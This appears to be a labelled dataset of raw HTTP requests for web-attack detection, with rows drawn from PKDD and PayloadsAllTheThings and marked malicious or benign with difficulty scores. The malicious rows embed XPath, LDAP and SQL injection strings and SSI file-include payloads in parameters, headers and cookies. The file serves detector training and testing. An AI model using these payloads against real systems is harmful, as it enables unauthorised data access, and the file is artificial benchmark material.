attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
XPath Injection,medium,,malicious,"POST /view HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Connection: close

q=substring(//user[userid=5]/username,2,1)=CHAR_HERE&id=1485",,227,patt-xpath-injection-0485,PayloadsAllTheThings,"substring(//user[userid=5]/username,2,1)=CHAR_HERE"
XPath Injection,medium,5.0,malicious,"POST /teEftpvPDcg8/hUZWa11-o6Ay9z/lZYpiz/Email6i/.M9ftpG/e5n15tlOvh/9adlieeobisn7l9i/rbL-f-4-bILL0t26G/hcYFgqQtelnetGXR/ireeeonatbnfetrznE/azeM/id2tresl9rHfyroz.mdb? HTTP/1.1
Content-Length: 299
Content-Language: oh,hte
Content-Encoding: compress
Content-Location: /4yt0euea/apes/t1aiuY/n0ucgt.wav
Content-MD5: TWc4ZnlzZ2VsdHd0NG9pNw==
Content-Type: application/x-www-form-urlencoded
Expires: Mon, 19 Jun 06 15:14:33 UTC
Last-Modified: Sat, 16 Apr 05 13:37:22 CET
Host: www.5iroEce.de
Connection: nroprh
Accept: image/jpeg;q=0.6, text/html;q=0.1, application/postscript
Accept-Charset: x-mac-roman, euc-jp;q=0.3, euc-cn, x-mac-hebrew
Accept-Encoding: deflate;q=0.0
Accept-Language: *;q=0.6
Cache-Control: no-store
Client-ip: 235.129.193.205
Cookie: ewAntotwc=athetnwd
Cookie2: $Version=""590""
Date: Wed, 27 Sep 06 15:39:21 GMT
ETag: ""iRPx-vhsrn5IOB4F@6ra""
Expect: oIwoedct
If-Modified-Since: Wed, 28 Jun 06 11:20:14 UTC
If-Unmodified-Since: Sun, 28 May 06 22:43:28 UTC
If-Match: *
If-None-Match: ""df9IpsfP7SmcfOrD""
If-Range: Tue, 28 Dec 04 20:22:45 GMT
Max-Forwards: 131
Pragma: r0moo4r=hwac
Proxy-Authorization: Basic bXNlczlyaDpudHNo
Referer: /thu0/hosro/zfhe/he4Ambem/nmiwn.exe
Trailer: Accept
User-Agent: Dcwnseeova/8.8.5
UA-Color: color16
UA-Pixels: 640x9904
Via: 2.0 www.tdocc.css, 2.5 57.80.165.189
Transfer-Encoding: gzip
Upgrade: 4mtfwe/7.8, Nuhsbd/2.0, ozoe1/6.1, oePeo/8.5, ats/0.5
X-Serial-Number: 3185085450816900238

hiecfnh=1960&dsgb=U2ra \taezeq&z1=n|au&Wnjfhttp2PnPOtZ=gdxp_enhttpsszHwgete7&o4laueatfst=d&&km48xrs=djstek1io&de8lo=eHg&XLlBbgsound8Fd=(i  <   count(ttt/child::text()) and  j    <  count(5e/child::comment())   and  k <  count(w1ewn8/child::*)  )",48688,1715,xml_test-48688,pkdd,
LDAP Injection,medium,,malicious,"POST /comments HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Connection: close

username=(&(sn=administrator)(password=M*)) : OK&id=1006",,214,patt-ldap-injection-0006,PayloadsAllTheThings,(&(sn=administrator)(password=M*)) : OK
XPath Injection,medium,4.0,malicious,"GET /a1ienzintsmpab9h/d5qSP@cF-cQ8rY.nsf?y0hoteRjo=aG&lcaQA=aotusr%3EticitE&iA08ohTp=8014 HTTP/1.1
Host: 53.180.166.32
Connection: keep-alive
Accept: application/zip;q=0.1, image/gif;q=0.7
Accept-Charset: x-mac-chinesesimp, x-mac-roman;q=0.6, windows-1251;q=0.3
Accept-Encoding: 
Accept-Language: *
Cache-Control: only-if-cached
Client-ip: 224.127.116.55
Cookie: rnmAgahiNra=nY3NTLXa
Cookie2: $Version=""3""
Date: Tue, 03 May 05 21:49:28 CET
ETag: W/""8bryrAVeHZlsVcY0""
Expect: preieae1=rrnnt7r
From: eoohueg@assyib.com
If-Modified-Since: Sat, 26 Feb 05 07:01:52 GMT
If-Unmodified-Since: Sun, 04 Oct 09 19:49:47 GMT
If-Match: ""6CicvDGcJuF-ExB_hJ""
If-None-Match: *
If-Range: ""AcMPFfFNC64nKHqcI9oi""
Max-Forwards: 2
MIME-Version: 6.0
Pragma: t='ety'
Proxy-Authorization: qtfde 1Tic=etNhghne
Authorization: ro2Xo ulta=pOrntd6
Referer: /hddsnr/hasleohe/sheyEhw9.cfm
TE: trailers,gzip;q=0.4,chunked;q=0.7
Trailer: If-Modified-Since
User-Agent: au']   |  P    |     //user[   name/text(  ) =   't3il
UA-Disp: 296,6544,16
UA-Color: color32
UA-Pixels: 433x249
Via: 0.5 www.onileto.jpg, pmwshi/7.2 21.94.135.100:329, 6.9 www.rdtwirs.html
Transfer-Encoding: uthgao
Upgrade: ggwu/8.7, eaee/3.4, wiazc/3.1, tznuol/7.6, gfi/8.6
Warning: 835 www.tlNlwgs.gif:920 ""iep7CLmofu"" ""Sun, 29 Feb 04 15:41:20 GMT""
X-Forwarded-For: 49.73.220.16
X-Serial-Number: 17618194843
----: -------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",48317,1454,xml_test-48317,pkdd,
SQLi,medium,3.5,malicious,"PUT /rrthToxtgu8StbrsE/ntaNieejtttbspw/gNIzfn9e1yboeoimhc.pl? HTTP/1.1
Content-Length: 315
Content-Language: skbo,rwmsoi,an
Content-Encoding: deflate
Content-Location: /9Iat0/gnsufteS/8trn/16svAcna/ozlde.swf
Content-MD5: dGxuNm9vaTExc21zaWVGZQ==
Content-Type: application/x-www-form-urlencoded
Expires: Mon, 27 Sep 04 16:50:17 CET
Last-Modified: Tue, 19 Oct 04 16:05:49 CET
Host: www.isn4b1s.ch
Connection: keep-alive
Accept: audio/basic
Accept-Charset: *;q=0.5
Accept-Encoding: *
Accept-Language: *
Cache-Control: no-store
Client-ip: 170.255.57.155
Cookie: ib7==eH2noshH;htsTeouyE=it5;irOpaTgiy6fdso9=boot.inirsOrne3;wetceiaiebos=9521
Cookie2: $Version=""41""
Date: Wed, 17 Oct 07 24:44:54 UTC
ETag: ""leLIR_bfgo22sOQ""
Expect: wObo=kcnn
From: svetgtH@ellbmBnam.fr
If-Modified-Since: Thu, 08 Jun 06 17:27:45 GMT
If-Unmodified-Since: Tue, 06 Oct 09 09:16:45 UTC
If-Match: ""LksjpT9Vqso3VodlRT""
If-None-Match: ""fC_FxN4kEMgnWxAyW925""
If-Range: "".lXwLS1Jjq6vq.LA56g""
Max-Forwards: 5
MIME-Version: 1.3
Pragma: no-cache
Proxy-Authorization: Digest uri=http://www.qaseCc.net/doze/ikttvm/5wrye.js
Authorization: pqonb enmhpnom=fenruoo7
Range: -86
Referer: /theo.wmn
TE: deflate;q=0.2
Trailer: Date
User-Agent: Mozilla/7.9 (X11; U; Open BSD i386 6.8; Ix-Ai; rv:7.5.3) Gecko/04561565
UA-CPU: MIPS
UA-Disp: 5047,1180,16
UA-OS: Mac OS X
UA-Color: color8
UA-Pixels: 738x118
Via: HTTP/4.8 14.7.10.11, 5.6 76.230.3.218, lka/0.4 www.ye7aetr.gif
Transfer-Encoding: deflate
Upgrade: oin5s/2.1, itrt/4.7, tsm/7.1
Warning: 594 www.eduo.css ""iv5whwy"" ""Sun, 10 Aug 08 19:07:44 UTC""
X-Forwarded-For: 243.251.179.229
X-Serial-Number: 9168693821015244526
----: --------------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~

isvnaeeusaby=lformKreplacex6gi0 &da7swticddte=6753&srtReoittbYtesn=256179&zrn9sf19yq=nurseesg&e98orvOo=053830&hlcsaAR=oaccepthaue&Ngottabgdoexarg=' AND USER_NAME()='eaun&ah11nahonl=9Dree6h&carhaicmuirWa2=>t>h&txdhllrE=mxjat&sasg3=m@V&amW5nanephdm=7xoi&ehm2dhhgahaxeer=sojkouQAtslh5&htsc=b&zRgcsF=761",41440,2070,xml_test-41440,pkdd,
SSI,medium,4.5,malicious,"GET /ttnke/uho4hUend7h/j6LYHyOR/MXYrXYMZze-oDST/couuES2lysohama8uyib/nph-7z6UxFRL0aHxB@/fm6YV@WqQM.jpeg? HTTP/1.0
Host: 68.253.190.55
Connection: nbat
Accept: audio/*, image/*
Accept-Charset: *
Accept-Encoding: *;q=0.6
Accept-Language: tuwra-konm, trst-6udie;q=0.1, i-t8ivsosi, aiqtkexa-uapM, e-sbQ;q=0.3
Cache-Control: mohet=gkl
Client-ip: 54.134.153.88
Cookie: vteaqdOta=nhce;lSdagtsio5Po=9dr;u4cht=<!-- #include     virtual=""d:\windows\autoexec.bat""    -->
If-Unmodified-Since: Sat, 09 Sep 06 05:51:34 CET
If-Range: Sun, 19 Feb 06 09:09:03 GMT
Pragma: no-cache
Authorization: Digest algorithm=MD5-sess
Referer: /swte/7xnpMe.tiff
User-Agent: Mozilla/0.3 (Machintosh; U; Mac OS X 9.1; Qe-tc; rv:2.5.0) Gecko/68411037
Transfer-Encoding: Er6aj; tiCaS=aemtatld",40395,774,xml_test-40395,pkdd,
,hard,-2.0,benign,"PUT /lgjjBvnyYHrw5WqQdqY/ge7uitta8cedru/UKor9G.jpeg? HTTP/1.1
Content-Length: 287
Content-Language: o
Content-Encoding: identity
Content-Location: http://www.nt1W1tgs.org/tghe/asaecyTs/pnnA/setkwr/mfileoO.tar
Content-MD5: cG9lYWU1aXplZGlsdEVpbg==
Content-Type: application/x-www-form-urlencoded
Expires: Sat, 13 Jan 07 24:04:39 CET
Last-Modified: Thu, 18 Nov 04 16:47:57 GMT
Host: www.aoeRu.be
Connection: close
Accept: */*;q=0.6
Accept-Charset: big5
Accept-Encoding: gzip, compress;q=0.5
Accept-Language: aethore-9o;q=0.1, t-e;q=0.5, ea8ojaao-s5wLmbw, esa3-o6atvsr, o1ovsolj-Wh
Cache-Control: no-cache
Client-ip: 182.146.49.239
Cookie: 0yp=a;itcctawelhra=06;tuthtmrG=F~tv@/e;es1i=/savbscripts
Cookie2: $Version=""0""
Date: Sat, 29 Jul 06 13:50:21 UTC
ETag: ""U0DNn@kPPXuJZ8.p""
Expect: lsstoeA
From: 4a64appe@alsxipenr.biz
If-Modified-Since: Fri, 17 Dec 04 10:22:14 UTC
If-Unmodified-Since: Tue, 21 Nov 06 01:45:05 UTC
If-Match: *
If-None-Match: *
If-Range: Wed, 12 May 04 23:07:22 GMT
Max-Forwards: 748
MIME-Version: 3.9
Pragma: a=vIn
Proxy-Authorization: NTLM UnJpbmVoenVuZXdjc2VpYVIzc2FvNXhyMWFhYW1uZnpuZXNtZW1lbWU=
Authorization: Digest username=""Othxha""
Range: 25-158969,392635-882565,41-
Referer: http://www.LeSaa.uk/ofooL/lerSwn/inndiE.zip
TE: trailers
Trailer: TE
User-Agent: tdsbhiweojefi
UA-CPU: 68000
UA-Disp: 287,078,16
UA-OS: Win98
UA-Color: color16
UA-Pixels: 2143x378
Via: 1.5 185.200.172.3, 0.0 28.254.151.19, 1.4 www.sr0er.html:94
Transfer-Encoding: rotuel; ieuoeo=zsydlcwa
Upgrade: httiri/1.3, 75a/6.7, ueeo/8.2
Warning: 039 18.32.213.153 ""1himeenD6aarst"" ""Wed, 25 Aug 04 07:02:03 UTC""
X-Forwarded-For: 149.226.91.226
X-Serial-Number: 1368641
----: ------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

rsetetoorgd9ea=dcr3rmcdtnrsktidwt&1inelXbrctyrTo1=rhiyd&k5eruag6htpI=4e&InunwdtfrjO=90&at=agmedSxfQZj&syt3icipemirse=it@&neNeoi0iDesidn=og6osne6pa&hozssd3gem=zlaT0o&apd3ri=a5maie&jncLazciW.=telnetnxelinkEoe13E3d3&ua=58597951&ylhsawieteen=4618&aw1U=%eie&ODYNYq69JV=is llecho3ds>y:",33082,2068,xml_test-33082,pkdd,
LDAP Injection,medium,4.0,malicious,"GET /zcuyefhelh6o/vtCeUr/efsza/logZ5u_t9HmWaccess_logG6/EiAa4qoiQeha/eNf96nlA_.hI9.jpg?Vx6G=047377&Acs4ttjngaaesu=a6-&rgWchicanfurcr=9oUyPWrnr&ifCiIolu=blnef&hcidvnh9=nm%40UBPs-7&3hs7ncatsh=f%5Dnald%3Bci+384&casuasso0=9hhtgocIaet&rns=ce&tPffuwulra=maexecaai&9Nhenhmer6f=nlrmhavingu&geidt=4 HTTP/1.1
Host: www.f6eo.be
Connection: isega
Accept: application/rtf
Accept-Charset: *
Accept-Encoding: 
Accept-Language: r6e)(&(objectClass=   hsG*)
Cache-Control: max-age=61878
Client-ip: 119.184.144.170
Cookie: tmiHnEenpn=595956826
Date: Mon, 09 Jan 06 02:16:14 UTC
If-Unmodified-Since: Tue, 13 Jun 06 07:43:13 UTC
If-Range: ""fz1gbnS_dC3mVHaw""
Max-Forwards: 067
Pragma: no-cache
Authorization: Basic aGhhZXNjOm9zQXd1c2R0
Referer: /dsY9eetn/nexh/sGold/uden/mfyweath.asp
User-Agent: Mozilla/1.5 (Machintosh; U; Mac OS X 4.5; at-it; rv:2.9.3) Gecko/46491612
Transfer-Encoding: deflate
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",36862,933,xml_test-36862,pkdd,
SSI,medium,4.0,malicious,"PUT /n6SYhYhBT6@/ae/mulTat/b5/IbsHnQEqREY/nv3t4TWD/J15w6fBfDdeletem/iMjH9Y1VX/xacie.shtml? HTTP/1.0
Content-Length: 29
Content-Language: 2immoq
Content-Encoding: deflate
Content-Location: http://www.ptaws.it/toampuC/1Dnsecy/ue2elt/hdso1a.tiff
Content-MD5: Z2lpZ3RtemxJRTNvZm5nbQ==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 24 Aug 05 06:21:42 GMT
Last-Modified: Sun, 12 Oct 08 05:51:23 UTC
Host: 64.254.67.253
Connection: keep-alive
Accept: text/*, audio/x-wav;q=0.5, video/mpeg
Accept-Charset: x-mac-chinesesimp, macintosh
Accept-Encoding: <!--  #include virtual=""d:\windows\autoexec.bat""  -->
Accept-Language: *
Cache-Control: oOfmnmht=aCt
Cookie: srjeo=4hhZsm6cdfc\t3o;c5al5rhh6wn=nuobject7u0Oe9aha;oVcyiirn9Rdr=pBNF-80N;kUmY@=nFX2Sm2h_53u
Date: Tue, 09 Sep 08 13:27:07 CET
Expect: 100-continue
If-Modified-Since: Thu, 12 Aug 04 06:45:31 UTC
If-Unmodified-Since: Wed, 20 Oct 04 16:11:48 GMT
If-Range: *
Max-Forwards: 8726
Pragma: no-cache
Proxy-Authorization: Digest username=""whvbx""
Authorization: Basic ZXdpbzpqc3JhMnM=
Range: 89435-
Referer: http://www.oe41nDyD.org/bdaywgam.js
TE: trailers,trailers
User-Agent: Mozilla/5.5 (compatible; Konqueror/3.7; Solaris; tthehe)
UA-CPU: 68000
UA-Color: color32
Via: 1Hnn/7.5 34.146.29.226, HTTP/6.3 87.118.188.219, 8.4 www.n0ir8dsk.png
Transfer-Encoding: identity
Upgrade: tyr/4.2, rsAlr/6.2
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

eatfp=veeheut1ei&om=eXjvtdz5C",40703,1465,xml_test-40703,pkdd,
SQLi,medium,3.0,malicious,"PUT /bbCEi/orotroead/DPV@7JRtelnet_BPphpXD/2Li2TG8rDV/sTHtIyg41K/e9z@U0h/Awp-jyoFselectf/jaean.dll? HTTP/1.0
Content-Length: 136
Content-Language: ra
Content-Encoding: compress
Content-Location: /fnzvali/seSspz/rqsjc9/kcatwwd/d0ro.png
Content-MD5: RGFSNmEwNm5hRW1lMWNlcg==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 28 Oct 09 17:39:24 UTC
Last-Modified: Mon, 30 Nov 09 04:09:04 GMT
Host: www.AcHneceb.fr
Connection: close
Accept: audio/x-wav;q=0.3
Accept-Charset: *
Accept-Encoding: *
Accept-Language: tgalnaor-9TgmECn2, az-a;q=0.9, tyuudOhm-aioinaun;q=0.9, imhemrct-5reIN;q=0.3
Cache-Control: min-fresh=6
Client-ip: 87.117.104.122
Cookie: lT=m2R
Cookie2: $Version=""9""
Date: Thu, 06 Nov 08 02:46:41 UTC
ETag: W/""0T-9MndUn8_eYiCf9G8s""
Expect: wObo=kcnn
From: svetgtH@ellbmBnam.fr
If-Modified-Since: Mon, 23 Mar 09 16:54:15 GMT
If-Unmodified-Since: Thu, 12 Jan 06 10:48:15 CET
If-Match: *
If-None-Match: ""a_YCkpd2EOy2bNf8ohzt""
If-Range: ""dfAkBc5BPKkPXjMlYg""
Max-Forwards: 8083
MIME-Version: 9.4
Pragma: nren='eyd'
Proxy-Authorization: Digest uri=http://www.qaseCc.net/doze/ikttvm/5wrye.js
Authorization: DOta oenSzuon=hsmcy
Range: 863-,45-,1-
Referer: /dgeijas/inari.avi
TE: deflate;q=0.2
Trailer: Via
User-Agent: Mozilla/5.0 (X11; U; SunOS sun4u 0.3; na-t7; rv:0.2.8) Gecko/42288464
UA-CPU: MIPS
UA-Disp: 338,3350,8
UA-OS: Mac OS X
UA-Color: color32
UA-Pixels: 738x118
Via: uTLL/1.4 www.eoasa.htm
Transfer-Encoding: identity
Upgrade: oin5s/2.1, itrt/4.7, tsm/7.1
Warning: 307 www.aiPaisn.jpeg:7090 ""ttaoiIpDdouernxa"" 
X-Forwarded-For: 12.79.200.187
X-Serial-Number: 9168693821015244526
----: -------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~

stylewoF2BIi=' OR   'enrnttaas'    >  'S&AgnlHm0Od=ddbnlesrt tilak&tssyahl5rTufe4=documentaxdGlrgscu 0s2Spiu&mbtachEdhivdh=162",41449,1846,xml_test-41449,pkdd,
SQLi,medium,3.0,malicious,"GET /gCareeee/shMPyGWyNY0/a6_qXBA7B8aE/hIOv@NSVoKI72Rha/neush3hMad3gayui/MGF/3aGFqKj3O4AwVg3/fTtdwlUynar/OEQHcfkcatpd/eYjIHON@Ke/nPk2CFkuav9/eI6U4vZZx.jsp?otoneornets=3&nmlc=11231&ru0=itQI&dropGHUb=oioniegBtabei6&mpbd=syto9fknO&enako2tfm=83&AmlRenMante=73319&Ieaemftrd=4489481&ge7NyDsBuStcr=nng%5Dnrlikenz%29em&eo=e-UTMGWPx&HnpIqjF=%27select+++++customer_phone+++%27%7C%7C%27from++++customers++%27%7C%7C%27where+++++customer_surname%3D%27%27%27%7C%7C+++++lv_surname%7C%7C%27%27%27++++and+customer_type%3D1%27%3B&petwudlan=vtRddsERonajnil&1xOPEfromJqYu=tx8CR9wQOIdO HTTP/1.1
Host: www.ordnh.net:8085
Connection: kehnzeS
Accept: video/mpeg;q=0.0
Accept-Charset: us-ascii;q=0.4
Accept-Encoding: *;q=0.9
Accept-Language: *;q=0.8
Cache-Control: no-cache
Client-ip: 36.147.99.223
Cookie: ddtiaoo=6;sRs3gr5d=rrns;t4uoiy=YxbaTteE e)egit;Q3jnBypK=Enyd;cNAnadt=15anastoGmailc
Cookie2: $Version=""4""
Date: Thu, 08 Sep 05 15:06:06 CET
ETag: ""rmoKgaJRhzxXhz04d""
Expect: uonhe=heuanl
From: hmrl@wdteioa4s.uk
If-Modified-Since: Sat, 14 Apr 07 21:10:42 UTC
If-Unmodified-Since: Mon, 04 Feb 08 09:38:11 UTC
If-Match: *
If-None-Match: *
If-Range: ""MaNbJCEuM_ftW1Ee""
Max-Forwards: 5617
MIME-Version: 5.3
Pragma: eiio=ystj
Proxy-Authorization: Digest response=""EDaFEE464Cd220549436Ba0ec5F670E1""
Authorization: NTLM QWVldHJ1bXNzSHdYMHRicGp0b3l1Z2FuaWlyaG5pY2hyVGFndg==
Range: 1010-
Referer: /4Sbidoc2/enmcNxts.sh
TE: gzip;q=0.9,gzip
Trailer: Proxy-Authorization
User-Agent: Ubdasnltotry8rnwO
UA-CPU: StrongARM
UA-Disp: 290,899,8
UA-OS: Linux
UA-Color: color16
UA-Pixels: 3499x504
Via: wh3i86/8.6 84.214.31.249, 6.6 152.243.157.211
Transfer-Encoding: gzip
Upgrade: nredd/1.9, kMnu/6.6, iarn/4.0
Warning: 076 187.215.178.176 ""4XWrtebohs"" 
X-Forwarded-For: 229.231.134.44
X-Serial-Number: 036660331124122
----: ---------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",42173,1906,xml_test-42173,pkdd,
,hard,-2.0,benign,"PUT /c5niutdneaasnmofon/Sz3xWJhttps2YN-/u7Gtpwun3Jh3m0wFrnSD/Qp_s4I3jEcorM1O/snwo9erm4uhRvsioem.jsp? HTTP/1.0
Content-Length: 189
Content-Language: ic
Content-Encoding: gzip
Content-Location: /8rDricu/twrn/e4tw5do/dt8thtn/7denht.wav
Content-MD5: eXNnaUh5c3R0aGNhZW50YQ==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 21 May 08 18:26:08 CET
Last-Modified: Sat, 19 Jan 08 11:20:33 GMT
Host: 121.69.47.115:80
Connection: keep-alive
Accept: */*;q=0.5
Accept-Charset: iso-8859-15, iso-8859-8-i;q=0.9
Accept-Encoding: 
Accept-Language: *;q=0.2
Cache-Control: no-cache
Client-ip: 80.30.219.68
Cookie: edlomi=eautoexec5n;eOittoZdjnan4=;mcnetinclude'metaeaccess_logm0;lhcr=owzyQ7;rt=cAfhsoLf
Cookie2: $Version=""762""
Date: Mon, 17 Nov 08 03:35:59 CET
ETag: ""16u5merbbmBxGJzc4""
Expect: 100-continue
From: l4eni@eruttntIgw.be
If-Modified-Since: Wed, 08 Sep 04 08:49:46 GMT
If-Unmodified-Since: Sun, 04 Jul 04 03:02:13 CET
If-Match: ""jSk@9DTwwtfSVtIsW4eh""
If-None-Match: *
If-Range: *
Max-Forwards: 424
MIME-Version: 1.8
Pragma: no-cache
Proxy-Authorization: NTLM MmJ1c2VQc29jYTQzQmFtTW1mQTNwc2l0bmF0bnRta2V1ZVJuZFN6ZWl3Zmhi
Authorization: Digest nonce
Range: 53-7,1-,223-
Referer: http://www.6aaop3i.fr/laaySt2/Ta3tr/tLgeaRLd.png
TE: trailers,trailers
Trailer: If-Match
User-Agent: nI9s0a8b/8.4.3
UA-CPU: StrongARM
UA-Disp: 9422,2675,16
UA-OS: Windows NT
UA-Color: color8
UA-Pixels: 0867x578
Via: 1.5 168.15.236.4:3178
Transfer-Encoding: hdsu; st8uehR=eucRd
Upgrade: ostuwl/1.1
Warning: 506 www.rkgan.shtml ""foasisheiEmi1anrehl"" ""Wed, 29 Sep 04 24:11:01 GMT""
X-Forwarded-For: 179.151.107.237
X-Serial-Number: 534170749
----: -----------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

ao5sse4lekSc=gB1_V&lrtiamaifac=rslips8te)&nO=9&dE7ereeoatrmMwr=sjqaEgrnhkeUer9ra&2sQt=eT8qHb&gEeeme=694&who36=35137276&herfe=ydYtdrvvdosd&1eeoUea=ifngcbwcoit)l&aa4iooo=nkApimn4Bb9nlueEe",7905,1931,xml_test-7905,pkdd,
,hard,-2.0,benign,"POST /noES5h/ocetde2lewlpeaat39cs/mTL-MBd4qu/rt6nraoa5/epDqjX5gFQg77XfSnAO1/ei.Wa2mSce./js214v@N5w8GfOj/egd3diseegnaeecapno/nEgzCT..UTST.pl? HTTP/1.1
Content-Length: 215
Content-Language: s,crrh,de65egee
Content-Encoding: identity
Content-Location: http://t5hRt.com/forrn80s.msf
Content-MD5: Mm5yaW00U2l6dXJ0cmVzZA==
Content-Type: application/x-www-form-urlencoded
Expires: Thu, 08 Jan 09 07:06:14 CET
Last-Modified: Mon, 29 Nov 04 22:22:10 CET
Host: www.ec1e0.net:80
Connection: close
Accept: */*;q=0.2
Accept-Charset: *;q=0.9
Accept-Encoding: *;q=0.5
Accept-Language: tosU-stesW;q=0.8, sL-sewrs, vae-bs, rppofeet-iene4;q=0.8, Yzylsats-tiof
Cache-Control: no-cache
Client-ip: 90.129.98.124
Cookie: i2td9=tahnohgSh;aso=yAnhon;ihuOardtharc45=63701843;wthaelgi=sw@IbVBq;SMgClS=ee4
Cookie2: $Version=""895""
Date: Tue, 24 Nov 09 11:35:46 GMT
ETag: ""4Bcs446OwvwT@LN@""
Expect: 100-continue
From: icsdyt@e0bCi193Ie.st
If-Modified-Since: Sat, 09 Oct 04 24:58:53 CET
If-Unmodified-Since: Mon, 22 Mar 04 17:51:19 CET
If-Match: ""kAnKcw6aZZq_VPglQ""
If-None-Match: *
If-Range: Tue, 14 Jul 09 24:54:33 UTC
Max-Forwards: 35
MIME-Version: 4.4
Pragma: no-cache
Proxy-Authorization: NTLM SHRmNm55cG1lZXJkZ0lnbnRzcm9KdGZvYTd5aHRjdHRpaUU=
Authorization: 3mpto gteSaebs=S7uI
Range: 349-717
Referer: /wuevrs.mdb
TE: trailers,trailers
Trailer: Upgrade
User-Agent: fVnn (aH7wVvf; nmu6ntP; f8BK60I6xi; hqX@5JLkGI; nKduk7Et8)
UA-CPU: MIPS
UA-Disp: 348,618,16
UA-OS: WinNT
UA-Color: color32
UA-Pixels: 272x562
Via: 0.8 www.hsussn.jpeg, 0.8 96.217.130.120, 3.8 www.sfzr.jpg
Transfer-Encoding: identity
Upgrade: drs/9.0, 7es/2.7, Dehele/2.8, hzewxo/8.7
Warning: 955 238.15.182.168 ""situlaoyhzbwnae"" 
X-Forwarded-For: 135.149.224.233
X-Serial-Number: 673720584538972
----: ----------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

8wz=0falAudenmion&tsmdlMeo=(hlxmleu/ eus&ldta9=55sgbueeinem45&asintNm=8143&sWcoruta=eN44mkck8mII&RQEVA9Y=shutdownvar>S8&a4tcsynrneehey=200990&eye=l9mrpi6L5&OGnleYhioz=omwt0e&WyNcUUhz=ts7ud&sjm=aatiuYsacFy$t0",5900,2058,xml_test-5900,pkdd,
